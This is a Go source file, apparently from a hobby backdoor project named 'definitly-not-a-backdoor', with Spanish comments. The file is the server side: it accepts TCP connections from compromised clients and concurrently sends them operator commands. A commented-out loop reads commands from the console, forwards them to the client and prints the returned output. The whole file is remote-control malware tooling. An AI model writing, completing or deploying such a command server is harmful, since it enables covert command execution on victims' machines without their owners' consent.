package tcpConnection

import (
	"fmt"
	"net"
	"os"

	"github.com/bruh-boys/definitly-not-a-backdoor/config"
	"github.com/bruh-boys/definitly-not-a-backdoor/other"
)

func StartServer() {

	other.PrintMessage("Server waiting connections on " + config.ConnHost + ":" + config.ConnPort + " (Connection type: " + config.ConnType + ")")

	l, err := net.Listen(config.ConnType, config.ConnHost+":"+config.ConnPort)
	if err != nil {
		fmt.Println("Error listening:", err.Error())
		os.Exit(1) // los os.Exit hay que evitarlos lo mas posible
		// si estas manejando un servidor tcp o lo que sea no es buena idea
		// hacer eso ya que en general suele haber muchos errores al menejar las conexiones y eso
		// solo esuna recomendacion
	}
	defer l.Close()
	for {
		conn, err := l.Accept()
		if err != nil {
			fmt.Println("Error accepting:", err.Error())
			return
		}

		//hago esto para que se ejecute en un nuevo hilo
		// asi se ejecuta de manera simultanea
		// asi que eres capaz de manejar lo que te envia el cliente
		//al mismo tiempo que manejas lo que recibes del cliente
		go handleConnection(conn)
		go sendCommands(conn)

	}
	/*
		c, err := l.Accept()
		if err != nil {
			fmt.Println("Error accepting:", err.Error())

		}
		log.Println("Client " + c.RemoteAddr().String() + " connected.")

		var command = ""
		for {
			fmt.Print("> ")
			scanner := bufio.NewScanner(os.Stdin)
			scanner.Scan() // use `for scanner.Scan()` to keep reading
			command = scanner.Text()
			log.Println(command)
			if command == "EXIT" {
				c.Write([]byte("EXIT"))
				break
			}
			if len(command) > 1024 {
				other.PrintMessage("The command is too large, it must be < 1024.")
				continue
			}
			c.Write([]byte(command))

			result, err := bufio.NewReader(c).ReadString('\n')
			if err != nil {
				log.Println("Error reading:", err.Error())
				return
			}

			fmt.Println(result)
		}*/
}
